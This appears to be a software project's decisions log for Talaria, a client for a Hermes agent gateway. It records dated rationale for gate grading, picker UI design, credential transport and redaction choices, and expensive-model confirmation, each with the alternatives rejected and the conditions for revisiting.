# Decisions - talaria

> Repo-scoped tactical decisions with rationale and revisit conditions.

## 2026-08-07

### Row 6 is graded on matched replies, and a pin the measurement proves wrong gets corrected rather than defended

**Author.** the reply-side pass that closed row 6, which found two of the shapes it was checking against were wrong

**Decision.** Row 6 of the v0.1 gate is graded `measured` on a two-part standard,
both parts stated so neither can be quietly relaxed. Every evidence-only method
in scope must have (1) at least one live outbound call in the recording corpus,
and (2) that call's reply matched back to it on JSON-RPC `id` and compared
against the pinned `response_shape` using `talaria.domain.compat.compare_shape`
— the production comparison, not a re-implementation of it. Enumeration alone is
not enough for the grade.

**Why the second part exists.** Enumeration answers "did Talaria call it". The
row asks whether these methods are compatible. Those are different questions, and
on 2026-08-07 they gave different answers: all twelve in-scope methods had live
calls, and two of the twelve had replies that did not match the pin. A row graded
on enumeration alone would have cleared clean and been wrong about two methods.

**And when the measurement contradicts the pin, the pin loses.** The baseline is
a record of what Hermes returns, so a measurement that finds it wrong and
corrects it on source evidence is the row working, not the row being dodged. Two
guards keep that from becoming a licence to edit whatever fails: the correction
must be confirmed against the Hermes source independently of the reply that
prompted it, and every corrected shape is pinned in
`tests/domain/test_recorded_reply_shapes.py` so a revert fails. Both corrections
of 2026-08-07 carry a source line — `approval.respond`'s `resolved` is typed
`-> int` in `tools/approval.py:2490-2505`, and `session.resume`'s
`messages_omitted` is set on all three of its success paths.

**Rejected: grade the row on enumeration and treat reply shapes as rows 17/18's
job.** Those rows do reply-matching only for the methods they cover — startup
acceptance and one streamed turn — which is five of eighteen. Nothing would have
covered the bridges, and the two wrong pins would still be in the file.

**Rejected: report the drift and leave row 6 blocking on it.** Defensible on its
face and wrong on inspection: the drift was in Talaria's record of Hermes, not in
Talaria's behaviour, and `talaria/ui/app.py` was already reading `resolved` as
the count it is. Blocking a gate on a stale comment while the code is correct
grades the documentation, not the client.

**What this does not do.** It does not prove nested compatibility.
`compare_shape` is top-level only (row 6a), by an explicit v0.1 scope decision,
and one matched reply per method is not exhaustive traffic. The row is graded on
the standard it declares.

**Revisit when.** `compare_shape` gains nested comparison, or a third pinned
shape turns out to be wrong — two corrections found by the first reply-side pass
ever run is a rate worth re-reading if it continues.

### `terminal.read.respond` leaves row 6's runtime-evidence requirement, and the exclusion names its own falsifier

**Author.** the operator, after the F2–F6 live-evidence run left row 6 one method short on something no amount of driving Talaria could produce

**Decision.** Row 6 of the v0.1 gate no longer requires runtime evidence for
`terminal.read.respond`. The method stays in `talaria/domain/compat.py` and stays
required for compatibility; nothing about what Talaria must support changed. What
changed is that the gate stops counting its absence as a gap.

**The condition, which is the whole justification.** Talaria answers this bridge
without a human overlay — `UNATTENDED_KINDS` is exactly `{"terminal_read"}` — so
the client half exists and would run. The request never arrives because the
gateway only emits `terminal.read.request` when the agent calls the
`read_terminal` tool, and that tool is offered to the model only when
`check_read_terminal_requirements()` passes, which tests the **gateway process's**
`HERMES_DESKTOP` environment variable. Its own docstring: "Desktop GUI only —
HERMES_DESKTOP is set on the gateway the app spawns." ADR-0001 makes Talaria a
client that dials a gateway it did not launch, so whether that variable is set is
not Talaria's to arrange.

**What was ruled out first, because it was the obvious answer and it was wrong.**
The tool returns "read_terminal is only available in the Hermes desktop app" when
its platform callback is absent, so an absent callback looks like the
explanation. It is not: `tui_gateway/server.py` wires `read_terminal_callback`
for every session and it reaches the tool through `run_agent.py` →
`agent_init.py` → `tool_executor.py`. The session that could not call the tool
had a callback. Recording the wrong mechanism would have made this exclusion
unfalsifiable, because nobody would have known what to test.

**The falsifier, stated so the exclusion can be undone.** Point Talaria at a
gateway whose process has `HERMES_DESKTOP` set, ask the agent to read the
terminal, and the bridge should complete. If it does, this decision is wrong and
the row goes back to requiring the evidence.

**Rejected: leave it required.** That is the status-quo option and it looks like
the rigorous one. It is not: it leaves a blocking row permanently short by a
method whose request is gated on an environment variable of a process Talaria
does not start, which converts a measurement into a stalemate. A gate condition
nobody can satisfy or refute stops carrying information.

**Rejected: drop it from `compat.py` as well.** Tempting for symmetry and wrong.
Talaria implements the bridge and a desktop-spawned gateway can send the request
at any time; a client that stopped pinning the shape would drift silently against
a method it still answers.

**What this does not do.** It does not clear row 6. `secret.respond` remains
outstanding and the row blocks on it, so the verdict stays **NOT READY** on rows
6 and 13.

**Followed later the same day.** `secret.respond` was provoked and answered live
a few hours after this entry was written, and row 6 cleared with
`terminal.read.respond` still excluded. The sequencing is left visible on
purpose: this decision did not clear the row, and reading it as though it had
would credit an exclusion with work a live run did.

**Revisit when.** Anyone runs Talaria against a desktop-spawned gateway — that
single run settles it either way. Also revisit if Hermes moves the terminal
buffer out of the desktop renderer, which would remove the environment gate
along with the reason for this entry.

### The picker is a modal dialog, overturning KTD3 — a listing is read, a picker is operated

**Author.** the picker redesign, on the operator's verdict at first live use

**Decision.** `/models` and `/profiles` open a modal dialog
(`talaria/ui/dialog.py`): arrows move a highlight, `enter` selects, typing
filters, `escape` backs out. KTD3 of the 2026-08-06 plan — a foldable region
with no focus and no keys, selected by typing `/models <n>` — is **overturned**.
The foldable `PickerRegion` is removed rather than kept alongside; both prior
arts have exactly one surface, and two surfaces showing the same list is worse
than either.

**Why the original decision was wrong, stated precisely, because it was not
careless.** KTD3 reasoned from `talaria/ui/palette.py:1-22`, which rejected a
modal search box for the *command listing* on the grounds that it would put a
second focus owner in front of the composer. That reasoning is correct and it
still stands for the palette. What it missed is that a command listing is
something an operator **reads** and a picker is something an operator
**operates**, and operating needs keys. The specific collision KTD3 was dodging
is real: the composer owns `enter` as "send message" while a picker needs
`enter` as "select the highlighted row". KTD3 avoided it by taking no focus at
all, and the numbered list was the price of that dodge. A modal does not dodge
it — while the dialog is up it is the only focus owner, so `enter` is
unambiguous, and on close the caret returns to the composer under the existing
rule in `talaria/ui/focus.py`. The operator's words, recorded in `QUEUED.md`:
"I expected it to work like the Hermes TUI. `/models` would open up a dialog
picker of some sort, not just a list I now need to pick a number."

**Prior art, read at pins, in ADR-0003's sense — behaviour to learn from, not a
source tree to translate.** Qwen Code v0.21.5
(`packages/cli/src/ui/hooks/useSelectionList.ts`) keeps its selection state in a
pure reducer with the rendering separate, which is why
`talaria/domain/selection.py` is a pure model this widget merely draws — and why
every navigation, filter and restock rule is tested with no terminal at all.
Hermes `ui-tui/src/components/modelPicker.tsx` at `f1470ec76` supplies the
staged shape (a provider, then that provider's models), type-to-filter, the
centred scrolling window, and the layered `escape` that clears a filter before
it pops a stage.

**Two places the prior art was deliberately not followed.**

- *Navigation visits unselectable rows rather than skipping them.* Qwen Code's
  `findNextValidIndex` steps over disabled entries, which is right for a
  five-row menu seen whole. Talaria's model list is about a hundred rows behind
  a window, and a provider is unauthenticated for a reason the operator can act
  on — skipping would make those rows unreachable *and* unexplained. The
  highlight lands, and `enter` names the reason it refuses.
- *Movement is arrows and the page/home/end family only.* Emacs-style `ctrl+p`
  is taken by Textual's own command palette (`App.COMMAND_PALETTE_BINDING`) and
  opens over the dialog; vim-style `j`/`k` are printable and belong to the
  filter, which is the wall Qwen Code's `disableVimNav` flag exists for. Both
  are asserted in `tests/ui/test_dialog.py` so neither is re-tried from memory.

**What did not change, and it is the reason the blast radius is small.** The
dialog emits the same 1-based row number `/models <n>` has always taken, and the
app dispatches it through the identical `select_model` / `select_profile` path.
Every refusal on that path — stale connection epoch (KTD4), unauthenticated
provider, undialable profile, already-connected profile — is unchanged and
untouched, so the surface that carried the row-19 live acceptance evidence is
the surface still doing the work.

**Rejected: a navigable region with `enter` conditional on an empty composer.**
The other shape put to the operator. It keeps KTD3 and needs no focus owner, and
it was rejected because "`enter` means two different things depending on
whether the composer happens to be empty" is a rule the operator has to learn
and cannot see. The operator chose the modal.

**Revisit when.** Textual's command palette is disabled or rebound, which frees
`ctrl+p` and makes emacs-style movement available; or a third surface wants the
same list-and-select shape, at which point `PickerDialog` is the widget and the
`PickerSource` protocol is the seam to build against.

### The picker shows two kinds of "current model" and names them apart, rather than picking one

**Author.** the operator's first round of feedback on the modal picker

**Decision.** The model picker marks and opens on the model **this session is
using**, tracked by Talaria itself (`SessionModel` in `talaria/ui/picker.py`),
and separately annotates the model the gateway reports as the **profile's
default**. Both rows render with their own note; only the session's row takes
the marker and the opening highlight. `SelectableRow.is_current` is renamed
`is_profile_default`, which is what it always held.

**Why two.** They are two different facts and Hermes keeps them in two
different places. `slash.exec` with `/model <name> --provider <slug>` changes
the running session and says so; `GET /api/model/options` builds its `model`
field from `load_config()` — the profile's `config.yaml` — so it answers for
the *next* session and never changes in response to a switch. Showing one and
calling it "current" made the picker mark a row the operator had just moved
away from. Showing one and suppressing the other would have left them unable to
see why Talaria disagrees with the Hermes dashboard. The mechanism is written
up in `LEARNINGS.md` under the same date.

**The honesty clause on the tracked value.** The switch is recorded only when
`RpcOutcome.confirmed` — a reply the gateway actually sent. An `unknown`
outcome means the call went out and nothing came back, and marking the row
there would put a claim on screen that Talaria cannot support. The record also
carries the session id it was made on and is checked against the focused
session at every read, so a resume or a profile switch cannot inherit it.

**Rejected: refetch the catalogue when the picker opens.** The obvious fix, and
it fixes nothing — the store it reads is not the store the switch writes, so
the refetched answer is identical. It would have cost a round trip per open and
added a failure path, in exchange for the same wrong marker.

**Revisit when.** Hermes publishes a session's own model over the transport —
an RPC, or a field on a session frame. That is a better source than Talaria's
memory of what it sent, and it would also answer for switches made from outside
Talaria, which nothing here can see.

### Left and right arrows are second names for back and select

**Author.** the operator's first round of feedback on the modal picker

**Decision.** In `PickerDialog`, `right` does exactly what `enter` does and
`left` does exactly what `escape` does — including `right` dismissing on a
final row and `left` closing the dialog at the root. Not a subset: `left` is
the same layered back, clearing a filter before it pops a stage.

**Why both rather than a choice.** The two-level shape (a provider, then that
provider's models) is spatial, and horizontal arrows are what a hand reaches
for in a spatial list. `enter`/`escape` stay because they are what the prior
art uses and what the hint has always named. The hint now names both pairs;
an affordance an operator has to discover by trying is one they will not find.

**What makes them free to take.** The filter is append-and-backspace with no
caret in it, so nothing else wants those keys. If the filter ever grows cursor
movement, `left`/`right` are the first two keys that collide — the note is in
`PickerDialog.on_key`'s docstring, where somebody adding that will be reading.

## 2026-08-06

### The admin HTTP credential rides two headers: `Authorization: Bearer` as decided, plus Hermes's dedicated session header

**Author.** building the admin HTTP client and its pure decode (unit U1 of `docs/plans/2026-08-06-model-picker-and-v0-1-closure-plan.md`)

**Decision.** KTD2 of that plan — "the credential rides an `Authorization: Bearer` header on HTTP" — is **confirmed, not revised**. The plan named one contingency that would have overturned it (source showing a query parameter is the supported HTTP form); that contingency did not fire. `talaria/transport/admin.py` additionally sends the same value in `X-Hermes-Session-Token`, which is a refinement of the decision rather than a departure from it.

This closes the item the entry below leaves under **"Deliberately left open."**

**The citation.** At Hermes `863e31318`, `hermes_cli/web_server.py`'s `_has_valid_session_token` accepts exactly two header forms and its own docstring ranks them: "The dedicated session header avoids collisions with reverse proxies that already use `Authorization` (for example Caddy `basic_auth`). We still accept the legacy Bearer path for backward compatibility with older dashboard bundles." The check is an `or`, so either header alone authenticates.

**Why the query-parameter form is not available here, stated so nobody re-tries it.** The WebSocket credential is a query parameter because Hermes reads `ws.query_params` only — the fact `talaria/transport/credentials.py` pins. The HTTP reader is different code: `_QUERY_TOKEN_API_PATHS` in the same module is a frozenset of exactly one path, `/api/files/download`, and `_has_valid_query_token` returns `False` for everything else. Confirmed live: `GET /api/model/options?token=<token>` answers **401**.

**Why both headers rather than either alone.** Bearer alone is the version-compatible choice — Hermes documents it as the form older bundles use, and ADR-0001 makes Talaria a client of a gateway it did not launch, so version skew is a real condition rather than a hypothetical. The dedicated header alone is the correct choice behind a reverse proxy that consumes `Authorization`, which is the exact collision Hermes names. Sending both is right in both directions. The cost is that the credential now has two header names, which is why `CREDENTIAL_HEADERS` is a named constant the leak tests iterate rather than two literals at the call site — a third form cannot be added without the absence assertions following it.

**Rejected: the dedicated header alone.** Cleaner, and it is the form Hermes prefers. Rejected because the installed checkout is shallow (one commit), so nothing available locally can date when that header was introduced — choosing it alone would have been a bet on gateway versions with no evidence behind it.

**A second finding, recorded because it will look like a bug later.** `GET /api/model/info` is in `hermes_cli/dashboard_auth/public_paths.py`'s `PUBLIC_API_PATHS` and needs **no** credential (confirmed live: no credential → 200), while `GET /api/model/options` is gated (no credential → 401). Talaria authenticates both uniformly anyway: the allowlist is Hermes's to revisit, and a client that only authenticated the endpoints currently requiring it would break silently on the release that gates one more.

**Revisit when.** Hermes drops the legacy Bearer path — its docstring already calls it legacy, so this is a question of when and not whether. At that point the Bearer header becomes dead weight and should be removed in the same change that raises Talaria's minimum supported gateway. Also revisit if Talaria ever needs a *gated* (OAuth) dashboard, where neither header applies and the SPA authenticates by cookie.

### The model picker reads the gateway's HTTP API, folds like the command listing, and switches profiles by reconnecting

**Author.** planning the model picker and the closure of v0.1 (`docs/plans/2026-08-06-model-picker-and-v0-1-closure-plan.md`)

**Decision.** Model and profile discovery goes over the transport, against the HTTP API Hermes serves on the same origin as the gateway WebSocket (`GET /api/model/options`, `GET /api/profiles`), reusing the origin derivation `talaria/transport/refresh.py` already established. The picker is a foldable region in the existing layout, not a modal overlay. Switching profiles means dialing a different gateway, not asking the running one to change.

**Why not read Hermes's own cache file.** `~/.hermes/provider_models_cache.json` holds exactly the list a picker wants, and reading it would be one line. ADR-0001 makes Talaria a client that dials a gateway **it did not launch**, potentially on another host — so a local file read does not fail when the gateway is remote, it silently returns *this* machine's model list for *that* machine's gateway. A wrong answer that looks like a right one is the failure mode this repository keeps paying for.

**Why a foldable region rather than an overlay.** `talaria/ui/palette.py:1-22` already rejected a modal search box for the command listing, on the grounds that it "would put a second focus owner in front of the composer, which is the one widget the interface is built around." The picker faces the identical tradeoff. Taking the opposite answer for the same tradeoff, in the same interface, would leave two contradictory precedents and no recorded reason — so the picker follows the standing decision, and reopening it stays available as its own change with its own argument.

**Why switching profiles is a reconnect.** `POST /api/profiles/active` sets a sticky preference for subsequent CLI commands and gateways and, in its own words, "does not retarget the already-running dashboard process" (`hermes_cli/web_routers/profiles.py:489`). A profile is a separate Hermes home with its own gateway, so `GET /api/profiles` is an endpoint directory — its `gateway_running` field says which entries are dialable — and Talaria never calls the POST. This also means each endpoint has its own credential, since every dashboard mints its own; the provider already resolves per dial, so the switch re-resolves rather than carrying one across.

**Deliberately left open.** Which credential form the HTTP surface officially uses. The WebSocket credential is a query parameter because Hermes reads `ws.query_params` only, a fact `talaria/transport/credentials.py` pins to source. An `Authorization: Bearer` header was observed working over HTTP on 2026-08-06, but observing a form work is not the same as establishing it is the supported one — the plan's first unit reads the Hermes source and cites it before any code depends on the answer.

**Revisit when.** The gateway grows a JSON-RPC method advertising models, which would make the HTTP surface unnecessary; or a second region wants the same list-and-select shape, at which point the picker's region is a widget rather than a feature.

### A document that gates a decision declares its blocking conditions in a form a test can read, and the test — not a convention — is what closes the loop

**Author.** closing the deferred item DRIFT-04 left behind: "A gating document has no inbound link from the work that clears it, so nothing re-opens it when it goes stale"

**Decision.** A document whose verdict gates a release, a merge, or a go/no-go call carries a fenced `gate` block stating its identifier, the verdict it currently holds, a `review-by` date, and one `blocks-on` line per condition holding that verdict in place, each naming an evidence-table row. `tests/docs/test_gating_documents.py` reads that block against the document's own prose. Work elsewhere that clears a condition records it as `Clears: <gate-id>#<condition-id>`. The first gate is the v0.1 daily-driver verdict, `v0-1-daily-driver`.

**Why a test and not a convention, when the deferred item proposed a convention.** DRIFT-04 did not happen because somebody forgot to write a backlink. It happened because the author of the clearing work had no reason to think about the verdict at all, and nothing in the repository could see that `LEARNINGS.md` and the verdict now asserted opposite things. A convention that depends on remembering is the mechanism that already failed, written down — so the deferred item's own first option was rejected as the fix and kept only as the notation the check reads.

**What makes the loop close without anybody remembering.** Editing the evidence-table row is what an author naturally does when a condition clears. One test then requires the gate block to quote the row's grade correctly, so the block cannot stay behind; a second refuses a block that still blocks on a condition the table now grades settled. Following the natural edit therefore forces the verdict to be restated. Both directions are pinned: flipping row 6's grade with the block left alone fails the first test and nothing else, and flipping both fails the second and nothing else.

**Why `review-by` exists even though it makes a test fail on the calendar.** Every other check needs somebody to edit something. A gating document that simply sits while the evidence moves — exactly what happened for three days — trips none of them. The horizon is the one assertion that fires on its own, and the cost is a red build on a day nobody changed code, landing on whoever is passing. That cost was weighed and accepted: moving the date is a visible act in a diff that a reviewer can question, and silence was not.

**Rejected alternative — the backlink convention alone.** Precise, cheap, and it fires only if the person who has already failed to think about the gating document remembers to write a line about it. Kept as the notation, rejected as the mechanism.

**Rejected alternative — a periodic re-read sweep.** It works: an audit found DRIFT-04. It cost a forty-requirement sweep to catch one stale paragraph, and it is late by up to one interval. `review-by` is that shape reduced to a single assertion, which is the affordable part of it.

**Rejected alternative — fire whenever the journal gains an entry since the gate was last reconciled.** Event-driven rather than calendar-driven, which is the better trigger in principle: it fires because work happened. Rejected on noise. `LEARNINGS.md` gains entries constantly, so it would fire almost every commit and be bumped without a re-read — a check that is always rubber-stamped is worse than no check, because the bump looks like reconciliation in the history.

**Rejected alternative — parse the conditions out of the prose and skip the block.** No parser can read "row 19 stays unmet, on a narrower reason than it used to carry" reliably, and one that half-works fails open. The block is redundant with the prose on purpose, and the redundancy is what is being checked.

**Revisit when.** A second gating document is written, which is the first real test of whether the block generalizes past an evidence-table-shaped document; or the horizon fires twice in a row and is bumped both times without anything moving, which would mean it is measuring the calendar rather than staleness.

### `HERMES_DASHBOARD_SESSION_TOKEN` leaves the credential chain, and row 13 may be re-graded exactly one step — not to *met*

**Author.** unit U3 of `docs/plans/2026-08-06-model-picker-and-v0-1-closure-plan.md`, executing KTD8 — option (b) of `QUEUED.md`'s entry "R1's environment clause is unmet, and no change to Talaria can meet it"

**Decision.** Talaria no longer reads a credential from `HERMES_DASHBOARD_SESSION_TOKEN`. The constant that named it (`TOKEN_ENV_VAR`) and the `_resolve` branch that read it are deleted from `talaria/transport/credentials.py`, and `"environment"` is removed from the `CredentialSource` type. Three routes remain, highest precedence first: a `token` query parameter on `TALARIA_GATEWAY_URL`; a `token` key in `<config_dir>/credentials` at mode `0600` or stricter, which `talaria refresh-credential` writes; and the interactive hidden prompt. Both refusal messages in `credentials.py` and the `talaria record` refusal in `talaria/cli.py` were rewritten to name only those three. `README.md` carries the decision and the caveat below.

#### How far this lets the v0.1 daily-driver verdict's row 13 be re-graded — the whole point of writing this down

U7 owns the verdict document and grades row 13 against this section; U3 deliberately does not touch it. What (b) supports, and nothing beyond it:

**Supported — the true claim, stated narrowly.** No credential route Talaria supports *requires* a credential in the process environment, and the operator who unsets `HERMES_DASHBOARD_SESSION_TOKEN` loses nothing: the credential file is a complete, first-class route with no environment footprint at all, and `talaria refresh-credential` removes the setup cost that was the original argument for the variable. R1's environment clause is therefore **satisfiable by operator procedure** rather than impossible, which it was not before.

**Not supported — do not write this anywhere.** That R1's environment clause is now met, technically or otherwise. An inherited variable stays visible in `/proc/<pid>/environ` for the life of the process; the kernel snapshots the environment block at `exec` and no code change touches that snapshot. Talaria not *reading* a variable does not make it unreadable to anyone else. `tests/transport/test_process_surface.py::test_the_inherited_credential_is_visible_in_the_process_environment` still asserts that failure, unchanged, and is meant to go red only if some future Talaria genuinely scrubs its inherited environment — at which point someone deletes it on purpose.

**Also not supported, and this one is easy to overclaim.** That no supported route puts a credential in the environment. Route 1 — a `token` on `TALARIA_GATEWAY_URL` — is an environment variable carrying a credential, and KTD8 explicitly keeps it. So the sentence "the environment is no longer a credential source" is false as written; the accurate sentence is "the environment is no longer a *required* credential source, and the dedicated credential variable is gone." Row 13 may be re-graded to reflect that a documented, measured, environment-free route exists and is the recommended one. It may not be graded *met*, and it may not be graded on the strength of a claim that Talaria reads nothing from the environment.

**Rejected alternative — option (a), keep the variable with a documented caveat.** `QUEUED.md` sized it Small against (b)'s Medium and it was the standing default. Rejected by the operator on 2026-08-06 because a caveat leaves the highest-precedence route being the one that cannot satisfy the requirement, so the safe path is the one the operator has to know to opt into. The recurring-setup objection that made (a) attractive was removed on 2026-08-04 by `talaria refresh-credential`.

**Rejected alternative — remove route 1 as well, so no environment-borne route survives.** This is the only change that would make "no supported route puts a credential in the environment" true, and it is tempting for exactly that reason. Rejected as out of scope: KTD8 names the three surviving routes explicitly and route 1 is one of them, and `talaria record`'s design leans on `TALARIA_GATEWAY_URL` resolving both halves. Recorded here rather than dropped, because the residual is precisely what limits row 13's re-grade.

**Rejected alternative — keep `TOKEN_ENV_VAR` and `"environment"` as public names.** The plan permitted keeping the constant if anything still needed it; nothing in production did. A source label nothing can produce is a precedence chain a test can still claim to have observed, and it is the seam a reintroduction slips back through. Deleting both cost seven test files a one-line change and made `mypy --strict` the thing that catches a stale label at merge — the cheapest possible place for that failure to land.

**Cost, stated plainly.** Every operator whose shell exports the dashboard variable and nothing else must run `talaria refresh-credential` once, or put a `token` on `TALARIA_GATEWAY_URL`. Eight test modules changed. Two rotation tests that proved KTD11's "a rotated credential is picked up without a restart" through the environment variable were re-expressed against the credential file and the endpoint URL rather than deleted — deleting a rotation test along with its variable would have taken a live guarantee with it and left no red anywhere.

**Revisit when.** Hermes gains an HTTP or file-based way to hand a client its session token directly, which would make the endpoint-URL route unnecessary and let route 1 go too — the one change that would let row 13 move again; or a gated (non-loopback) deployment arrives and `GatedTicketProvider` rewrites the chain wholesale.

### The default-model write extends `/models`'s own grammar; it does not add a fourth local command, and the profile it writes is the connected one, not a typed one

**Author.** v0.1 model-picker plan, unit U5 (`POST /api/model/set`)

**Decision.** `/models <n> default` writes catalogue row `<n>` as the default model for `self.current_profile` — the profile this session is already connected to (U4) — and `/models <n> default confirm` is the second act KTD7's expensive-model guard requires when the first comes back `confirm_required`. Neither is a new `LocalCommand`; both are argument shapes `_perform_models` parses off the existing `/models` entry, matching the plan's own design note that "U5 adds no command; setting a default is an act inside the picker." The profile the write targets is never typed on the command line — a session with no connected profile (`current_profile == ""`) refuses the write with `MODEL_DEFAULT_NO_PROFILE` rather than asking which profile was meant.

**Evidence.** Hermes's `POST /api/model/set?profile=<name>` accepts any profile name in the query string, including one the connected dashboard is not itself running (`_apply_model_assignment_sync` opens `_profile_scope(profile)` around the write) — so *architecturally* Talaria could let an operator type an arbitrary profile name. It does not, because U4 already gives the operator a way to name a profile: switch to it. A second way to name one on this command line would be two spellings of the same fact that can silently disagree.

**Rejected alternatives.** *A fourth `LocalCommand`, `/model-default` or similar* — the plan's summary explicitly rules this out, and a fourth plural/singular-shadowing name is one more collision an operator has to learn (`/models` vs. Hermes's `/model` is already one). *Accept a profile name as a third argument, `/models <n> default <profile>`* — lets a mistyped profile name write a default to a profile the operator did not mean to touch, silently, with no dial and no confirmation of *which* profile beyond the string typed; scoping to the connected profile makes "which profile" a fact the operator already established by connecting to it.

**Cost.** An operator who wants to set a default for a profile other than the one they are on must switch to it first (`/profiles <n>`), then write the default. Two acts instead of one, but each is legible on its own and neither can target the wrong profile by typo.

**Revisit when.** The picker's profile mode grows a per-row "set as default without switching" act — at which point the profile becomes an explicit selection from the profile listing rather than an implicit one from `current_profile`, and the two mechanisms should be reconciled rather than left to diverge.

### KTD7's two-act confirmation is enforced by call shape at every layer, not by trusting a caller to remember

**Author.** v0.1 model-picker plan, unit U5, implementing KTD7 ("the expensive-model confirmation is surfaced, never auto-confirmed")

**Decision.** `confirm_expensive_model` has no default anywhere it is threaded through: `AdminClient.set_default_model` declares it a required keyword, and `TalariaApp.set_model_default` takes `confirm: bool = False` but the *only* call site that ever passes `confirm=True` is the branch of `_perform_models` that matched the literal second word `confirm` in `/models <n> default confirm`. A bare `/models <n> default`, typed any number of times, always resolves to `confirm=False` — repeating it is not the second act, because nothing about repeating the same line changes what is passed.

**Evidence.** `tests/transport/test_admin.py::test_set_default_model_has_no_default_for_confirm_expensive_model` asserts the transport-level guarantee via `inspect.signature`. `tests/ui/test_picker.py::test_confirm_required_shows_the_message_and_the_first_call_never_confirms` and `test_the_second_distinct_act_resends_confirmed_and_completes` assert the UI-level guarantee behaviourally: two separate `pilot.press("enter")` submissions, the first of which the double records with `confirm_expensive_model: False` regardless of how many times it is sent.

**Rejected alternatives.** *A confirmation flag on the picker widget's own state, toggled by a keypress* — would satisfy KTD3's "no captured caret" rule poorly, since a stateful toggle the operator cannot see the value of is exactly the kind of hidden mode KTD3's "selection by command" was chosen to avoid. *Auto-resend with `confirm_expensive_model=True` after showing the message once* — is the literal failure KTD7 exists to prevent: the entire feature's motivation is not spending money by accident, and an automatic second call defeats the one guard already protecting against that.

**Cost.** An operator who intends to accept an expensive-model default must type two lines instead of one. That friction is the point, not a side effect.

**Revisit when.** Hermes's cost guard grows a per-session "always confirm for me" preference that this plan did not anticipate — at which point the guard, not Talaria, would be deciding whether a second act is required, and this decision would need to say how Talaria surfaces that preference rather than assume the guard always fires.

## 2026-08-05

### When the deliverable is evidence rather than code, a reproducible measurement stands in for a test gate — and the measuring script stays out of the repository

**Author.** planning the restatement of the v0.1 daily-driver verdict (DRIFT-04), where the only code change is one docstring

**Decision.** Work whose product is a graded claim — an audit row, a verdict, a requirement marked met — is gated by a **measurement anyone can re-run**, not by the suite. The document states the method precisely enough that a reader holding a corpus reproduces the number, and the number written into the document is the one the measurement printed. The script that produced it is **not** committed.

**Why not commit the script.** It can only run on a machine holding recordings, and R29 keeps corpora out of version control permanently. A committed grader would therefore be a check that never executes in CI and sits skipped on every machine that matters — worse than no check, because a permanently-skipped test reads as coverage. Describing the method in the artifact costs a reader more effort and cannot rot into a false green.

**Why a stated method rather than a stated number.** A number with no method behind it is exactly what DRIFT-04 is: the verdict's R2 and R3 rows carried confident reasons that nobody could re-derive, so nothing caught them when they stopped being true. A method survives the corpus growing; a number does not.

**The control that makes it a measurement and not an agreement.** A re-grading pass that confirms everything it examined has not measured anything. At least one claim must come back **false** — for this work, row 6 of the verdict, which planning measured and found unchanged: exactly three of the thirteen evidence-only gateway methods have live evidence and ten still have none, unchanged since 2026-08-02 despite a client that has since attached repeatedly. A pass reporting universal improvement is re-run rather than believed.

**Rejected alternative — commit the grader with a skip-if-no-corpus guard.** It buys a green tick that measures nothing wherever it runs, and it puts the thing that decides whether a release gate opens behind a check that is structurally incapable of failing in CI.

**Rejected alternative — treat the project check as the gate.** `ruff`/`mypy`/`pytest`/`bandit` running green says nothing about whether a verdict row is true. Using it as the gate here would be the same category error as an exit-code assertion that more than one route can satisfy (see the 2026-08-05 LEARNINGS entry on vacuous refusal tests).

**Revisit when.** A second artifact needs the same treatment. One instance is a decision; two make it a convention worth a shared helper, and at that point the "do not commit the script" call is worth re-testing against whatever the second case needs.

### A corpus citation names its scope in its label, because "the corpus" is not one thing

**Author.** restating the v0.1 daily-driver verdict (DRIFT-04), KTD4 of the restatement plan

**Decision.** A citation of recorded evidence states which of two different constructions produced it, and the label carries that distinction rather than leaving it to be inferred:

- **One recording.** `live_corpus_identity` (`talaria/replay/gate.py:317-328`), the repository's existing helper: `sha256` over one file's raw bytes, labelled `talaria-live-v1-<frames>f-<sha256[:12]>`. Both citations already in the repository before this restatement are this form — `talaria-live-v1-32f-5f477fa24fa5` (the 32-frame recording behind R3's replay comparison) and `talaria-live-v1-5773f-88a3604c34b7` (the Textual gate results).
- **The whole corpus.** An aggregate this helper cannot produce and whose label must not borrow the single-recording form: `talaria-live-corpus-v1-<total frames>f-<sha256[:12]>`, hashing each recording's raw bytes concatenated in filename-sorted order, with the frame count summed across the corpus. `talaria-live-corpus-v1-2659f-bd69e537f1d9` is the first use, behind the verdict's restated row 6 and row 2.

**Why the label has to carry the distinction rather than the surrounding prose.** A reader who reaches for `live_corpus_identity` to check an aggregate figure gets a different hash back — not because the number is wrong, but because the label gave no signal that a different construction produced it. That is exactly the failure KTD1 names: a number nobody can re-derive is not evidence. The `-corpus-` segment is what lets a reader tell, from the label alone and before recomputing anything, which construction to reproduce.

**Rejected alternative.** Reuse `live_corpus_identity`'s label form for the aggregate and rely on the citing sentence to say "aggregate" in prose. Rejected because a label is copied and pasted more often than the sentence around it is read; the distinction has to survive that.

**Revisit when.** A third construction is needed — a windowed or filtered subset of the corpus, say — at which point this becomes a small family of scoped label prefixes rather than two, and the naming rule should be written once rather than per-construction.

### A URL fragment is withheld whole in a recording and dropped outright from a dialled endpoint

**Author.** closing the P2 left open by the code-review gate on the credential-and-bridge-drift remediation

**Decision.** A URL can carry a credential in three positions, and the frame log now withholds all three: a credential-shaped query parameter, the userinfo ahead of the host, and the fragment. The fragment is taken **whole and unread** — every fragment, not only ones that look credential-bearing. The two code paths treat it differently on purpose:

| path | function | treatment | why |
| --- | --- | --- | --- |
| the URL that is *recorded* | `redact_url` | replaced by `%5Bredacted%5D` | a reader must see a marked hole, not a URL that looks like it never had a fragment |
| the URL that is *dialled* | `strip_credential_query` | removed | this URL is used, not read; a marker on it would be junk sent to a gateway |

**Why withhold the whole component instead of filtering inside it.** A fragment is one opaque string. `#token=v` and `#v` are equally ordinary ways to write one, so there is no key to match against `CREDENTIAL_QUERY_KEYS` and no structure to filter. That leaves only "take every fragment" or "take none", and none was the state this replaced. It is the same reasoning that already takes the whole userinfo rather than the half after the colon: guessing which part of an opaque component is the secret leaks exactly the case worth catching.

**The cost, accepted knowingly.** This is the widest of the redactor's five deliberate divergences from the TypeScript reference, and the only one that fires on a value plainly holding no credential — a document anchor on an unrelated `https` URL quoted inside a frame body is now withheld. Over-redaction is a real failure here, not the safe direction; the corpus exists to be studied. It is accepted because the loss is one anchor, it is recorded as a `url-credential` redaction rather than applied silently, and Talaria's own `ws`/`wss` endpoints lose nothing at all: a fragment is a client-side selector that is never sent on the wire.

**Why this was a format decision and not a bug fix.** `endpoint` is a documented field of a format other tools read, so widening what it withholds changes a promise rather than correcting a mistake. `docs/formats/frame-log.md` now states the promise and the date it changed, because a recording made before 2026-08-05 may carry a fragment verbatim and a reader has no other way to know.

